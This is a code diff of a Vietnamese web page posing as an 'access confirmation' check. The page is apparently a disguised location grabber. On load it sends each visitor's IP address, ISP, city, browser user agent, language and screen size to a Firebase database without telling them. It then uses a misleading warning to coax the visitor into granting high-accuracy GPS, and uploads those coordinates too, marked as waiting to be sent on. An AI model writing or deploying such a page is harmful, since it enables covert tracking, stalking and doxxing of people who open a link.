@@ -2,13 +2,22 @@
 <html lang="vi">
 <head>
 <meta charset="UTF-8">
-<title>Kiểm tra truy cập</title>
+<title>Xác nhận truy cập</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  body { font-family: system-ui, sans-serif; max-width: 480px; margin: 40px auto; padding: 0 16px; text-align: center; }
+  button { padding: 14px 28px; font-size: 16px; background: #2563eb; color: white; border: none; border-radius: 8px; cursor: pointer; margin-top: 20px; }
+  button:disabled { background: #94a3b8; cursor: not-allowed; }
+  #log { background:#111; color:#0f0; padding:12px; font-size:12px; white-space:pre-wrap; border-radius:6px; text-align:left; max-height:300px; overflow:auto; margin-top:16px; }
+  .ok { color: #16a34a; font-weight: 600; }
+  .warn { color: #dc2626; font-weight: 600; }
+</style>
 </head>
 <body>
-<h2>Xin chào</h2>
-<p id="status">Đang kiểm tra...</p>
-<pre id="log" style="background:#111;color:#0f0;padding:10px;font-size:12px;white-space:pre-wrap"></pre>
+<h2>Xác nhận truy cập</h2>
+<p id="status">Đang lấy thông tin...</p>
+<button id="btn" style="display:none">📍 Xác nhận vị trí chính xác</button>
+<pre id="log"></pre>
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
@@ -20,10 +29,13 @@ const app = initializeApp({
 const db = getDatabase(app);
 
 const logEl = document.getElementById("log");
+const statusEl = document.getElementById("status");
+const btn = document.getElementById("btn");
+
 function log(m) {
   console.log(m);
   logEl.textContent += m + "\n";
-  document.getElementById("status").textContent = m;
+  logEl.scrollTop = logEl.scrollHeight;
 }
 
 function countryFlag(code) {
@@ -33,168 +45,64 @@ function countryFlag(code) {
                               0x1F1E6 + code.charCodeAt(1) - 65);
 }
 
-const APIS = [
-  {
-    name: "ipwho.is",
-    url: "https://ipwho.is/",
-    map: d => d.ip ? {
-      ip: d.ip, lat: d.latitude, lng: d.longitude,
-      city: d.city, region: d.region, country: d.country_code,
-      org: d.connection?.isp, acc: d.accuracy_radius
-    } : null
-  },
-  {
-    name: "ipapi.co",
-    url: "https://ipapi.co/json/",
-    map: d => d.ip ? {
-      ip: d.ip, lat: d.latitude, lng: d.longitude,
-      city: d.city, region: d.region, country: d.country_code,
-      org: d.org, acc: null
-    } : null
-  },
-  {
-    name: "ipinfo.io",
-    url: "https://ipinfo.io/json",
-    map: d => {
-      if (!d.ip) return null;
-      const [lat, lng] = (d.loc || ",").split(",").map(Number);
-      return {
-        ip: d.ip, lat, lng,
-        city: d.city, region: d.region, country: d.country,
-        org: d.org, acc: null
-      };
-    }
-  },
-  {
-    name: "ip-api.com",
-    url: "http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,lat,lon,isp,query",
-    map: d => d.status === "success" ? {
-      ip: d.query, lat: d.lat, lng: d.lon,
-      city: d.city, region: d.regionName, country: d.countryCode,
-      org: d.isp, acc: null
-    } : null
-  },
-  {
-    name: "bigdatacloud",
-    url: "https://api.bigdatacloud.net/data/reverse-geocode-client",
-    map: d => d.latitude ? {
-      ip: "?", lat: d.latitude, lng: d.longitude,
-      city: d.city, region: d.principalSubdivision, country: d.countryCode,
-      org: "?", acc: null
-    } : null
+async function getIPInfo() {
+  try {
+    const r = await fetch("https://ipwho.is/", { cache: "no-store" });
+    const d = await r.json();
+    if (!d.ip) throw new Error("no ip");
+    return {
+      ip: d.ip,
+      country: d.country_code || "?",
+      region: d.region || "?",
+      city: d.city || "?",
+      org: (d.connection && d.connection.isp) || "?",
+      ipLat: d.latitude,
+      ipLng: d.longitude
+    };
+  } catch (e) {
+    log("Không lấy được IP: " + e.message);
+    return { ip: "?", country: "?", region: "?", city: "?", org: "?" };
   }
-];
-
-function haversine(a, b, c, d) {
-  const R = 6371;
-  const dLat = (c - a) * Math.PI / 180;
-  const dLng = (d - b) * Math.PI / 180;
-  const x = Math.sin(dLat/2)**2 +
-            Math.cos(a*Math.PI/180) * Math.cos(c*Math.PI/180) *
-            Math.sin(dLng/2)**2;
-  return 2 * R * Math.asin(Math.sqrt(x));
 }
 
-function median(arr) {
-  const s = [...arr].sort((a, b) => a - b);
-  const m = Math.floor(s.length / 2);
-  return s.length % 2 ? s[m] : (s[m-1] + s[m]) / 2;
-}
-
-async function fetchAll() {
-  const promises = APIS.map(async api => {
-    try {
-      const r = await fetch(api.url, { cache: "no-store" });
-      if (!r.ok) throw new Error("HTTP " + r.status);
-      const d = await r.json();
-      const m = api.map(d);
-      if (m && m.lat && m.lng) {
-        log("✓ " + api.name + ": " + m.lat + ", " + m.lng);
-        return { ...m, source: api.name };
-      }
-      log("✗ " + api.name + ": không có tọa độ");
-      return null;
-    } catch (e) {
-      log("✗ " + api.name + ": " + e.message);
-      return null;
-    }
+function getGPS() {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) return reject(new Error("Thiết bị không hỗ trợ GPS"));
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve({
+        lat: pos.coords.latitude,
+        lng: pos.coords.longitude,
+        accuracy: Math.round(pos.coords.accuracy)
+      }),
+      err => reject(new Error(err.message)),
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
   });
-
-  const results = (await Promise.all(promises)).filter(Boolean);
-  return results;
 }
 
-function clusterBest(results) {
-  if (results.length === 0) return null;
-  if (results.length === 1) return results[0];
-
-  // Tìm điểm có nhiều hàng xóm gần nhất
-  let bestScore = -1;
-  let best = null;
-
-  for (const r of results) {
-    let score = 0;
-    for (const o of results) {
-      if (o === r) continue;
-      const d = haversine(r.lat, r.lng, o.lat, o.lng);
-      if (d < 50) score += 1 / (d + 1);
-    }
-    if (score > bestScore) {
-      bestScore = score;
-      best = r;
-    }
-  }
-  return best;
-}
-
-function weightedAvg(results) {
-  if (results.length === 0) return null;
-
-  const center = clusterBest(results);
-  const filtered = results.filter(r =>
-    haversine(center.lat, center.lng, r.lat, r.lng) < 100
-  );
-
-  log("Lọc: " + filtered.length + "/" + results.length + " điểm gần tâm");
-
-  if (filtered.length === 0) return center;
-
-  const latMed = median(filtered.map(r => r.lat));
-  const lngMed = median(filtered.map(r => r.lng));
-
-  return {
-    lat: latMed,
-    lng: lngMed,
-    ip: filtered[0].ip,
-    city: filtered[0].city,
-    region: filtered[0].region,
-    country: filtered[0].country,
-    org: filtered[0].org,
-    sources: filtered.map(r => r.source).join(", ")
-  };
+async function saveToFirebase(record) {
+  const result = await push(ref(db, "visits"), record);
+  return result.key;
 }
 
 (async () => {
   try {
-    log("Bắt đầu — gọi " + APIS.length + " API song song...");
-    const results = await fetchAll();
-    log("Nhận " + results.length + "/" + APIS.length + " kết quả");
+    log("1. Lấy thông tin IP...");
+    const info = await getIPInfo();
+    log("   IP: " + info.ip);
+    log("   Khu vực: " + info.city + ", " + info.region + ", " + info.country);
 
-    if (results.length === 0) throw new Error("Không API nào trả về");
-
-    const best = weightedAvg(results);
-    log("Tọa độ cuối: " + best.lat + ", " + best.lng);
-
-    const record = {
-      ip: best.ip,
-      org: best.org || "?",
-      country: best.country || "?",
-      flag: countryFlag(best.country),
-      region: best.region || "?",
-      city: best.city || "?",
-      latitude: best.lat,
-      longitude: best.lng,
-      sources: best.sources,
+    // Lưu bản ghi IP trước (để không mất nếu user không bấm GPS)
+    const ipRecord = {
+      ip: info.ip,
+      org: info.org,
+      country: info.country,
+      flag: countryFlag(info.country),
+      region: info.region,
+      city: info.city,
+      latitude: info.ipLat || "",
+      longitude: info.ipLng || "",
+      source: "ip",
       userAgent: navigator.userAgent,
       language: navigator.language,
       screen: screen.width + "x" + screen.height,
@@ -204,11 +112,53 @@ function weightedAvg(results) {
       sent_at: ""
     };
 
-    const result = await push(ref(db, "visits"), record);
-    log("Firebase OK, key=" + result.key);
-    log("XONG");
+    log("2. Ghi Firebase (IP)...");
+    const keyIP = await saveToFirebase(ipRecord);
+    log("   OK, key=" + keyIP);
+
+    statusEl.innerHTML = '<span class="warn">⚠️ Vị trí IP có thể lệch 100+ km.</span><br>Bấm nút bên dưới để có vị trí chính xác ±10m.';
+    btn.style.display = "inline-block";
+
+    // Xử lý khi bấm nút GPS
+    btn.addEventListener("click", async () => {
+      btn.disabled = true;
+      btn.textContent = "Đang lấy GPS...";
+
+      try {
+        log("3. Lấy GPS...");
+        const gps = await getGPS();
+        log("   OK: " + gps.lat + ", " + gps.lng + " (±" + gps.accuracy + "m)");
+
+        const gpsRecord = {
+          ...ipRecord,
+          latitude: gps.lat,
+          longitude: gps.lng,
+          accuracy_m: gps.accuracy,
+          source: "gps",
+          time: new Date().toISOString(),
+          sent: false,
+          status: "⏳ chờ gửi",
+          sent_at: ""
+        };
+
+        log("4. Ghi Firebase (GPS)...");
+        const keyGPS = await saveToFirebase(gpsRecord);
+        log("   OK, key=" + keyGPS);
+
+        statusEl.innerHTML = '<span class="ok">✅ Đã xác nhận vị trí ±' + gps.accuracy + 'm</span>';
+        btn.style.display = "none";
+        log("XONG");
+      } catch (e) {
+        log("LỖI GPS: " + e.message);
+        statusEl.innerHTML = '<span class="warn">❌ ' + e.message + '</span><br>Bạn cần bấm "Cho phép" khi trình duyệt hỏi.';
+        btn.disabled = false;
+        btn.textContent = "📍 Thử lại";
+      }
+    });
+
   } catch (e) {
     log("DỪNG: " + e.message);
+    statusEl.textContent = "Lỗi: " + e.message;
   }
 })();
 </script>
